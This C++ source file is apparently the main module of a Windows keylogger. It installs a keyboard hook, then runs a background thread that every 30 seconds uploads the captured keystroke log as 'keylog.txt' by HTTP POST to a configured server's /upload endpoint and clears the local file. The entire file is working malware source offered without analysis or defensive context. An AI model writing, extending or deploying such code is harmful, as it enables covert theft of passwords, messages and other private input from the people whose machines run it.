#include "hook.h"
#include <cstdio>
#include <string>
#include <wininet.h>
#include <thread>
#include <chrono>
#include "config.h"

#pragma comment(lib, "wininet.lib")

void clearFile(const char *filename)
{
    FILE *fp = fopen(filename, "w");
    if (!fp)
        return;
    fclose(fp);
}

void sendToApi(const std::string &filename)
{
    FILE *file = fopen(filename.c_str(), "rb");
    if (!file)
        return;

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    rewind(file);

    if (fileSize <= 0)
    {
        fclose(file);
        return;
    }

    std::string fileData(fileSize, '\0');
    size_t readSz = fread(&fileData[0], 1, fileSize, file);
    fclose(file);
    if (readSz != static_cast<size_t>(fileSize))
    {
        return;
    }

    const std::string boundary = "----KeyloggerMultipartFormUploadBoundary";
    std::string body;
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"keylog.txt\"\r\n";
    body += fileData;
    body += "\r\n--" + boundary + "--\r\n";

    std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary;
    std::wstring wContentType(contentType.begin(), contentType.end());

    HINTERNET hInternet = InternetOpen(L"Keylogger", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet)
        return;

    std::wstring wServerHost(SERVER_HOST, SERVER_HOST + strlen(SERVER_HOST));
    HINTERNET hConnect = InternetConnectW(hInternet, wServerHost.c_str(), INTERNET_DEFAULT_HTTP_PORT,
                                          NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect)
    {
        InternetCloseHandle(hInternet);
        return;
    }

    HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", L"/upload", NULL,
                                          NULL, NULL, 0, 0);
    if (!hRequest)
    {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    BOOL sent = HttpSendRequestW(hRequest, wContentType.c_str(), -1L,
                                 (LPVOID)body.c_str(), body.length());

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

std::string readFile(const char *filename)
{
    FILE *file = fopen(filename, "rb");
    if (!file)
        return "";

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    rewind(file);

    if (fileSize <= 0)
    {
        fclose(file);
        return "";
    }

    std::string fileData(fileSize, '\0');
    size_t readSz = fread(&fileData[0], 1, fileSize, file);
    fclose(file);
    if (readSz != static_cast<size_t>(fileSize))
    {
        return "";
    }
    return fileData;
}

void startSendTimer(const char *filename, int intervalSeconds)
{
    while (true)
    {
        std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));

        std::string data = readFile(filename);
        if (!data.empty())
        {
            sendToApi(filename);
            clearFile(filename);
        }
    }
}

int main()
{
    if (!installHook())
    {
        return 1;
    }

    std::thread senderThread([=]()
                             { startSendTimer(LOG_FILE_PATH, 30); });
    senderThread.detach();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }

    uninstallHook();
    return 0;
}

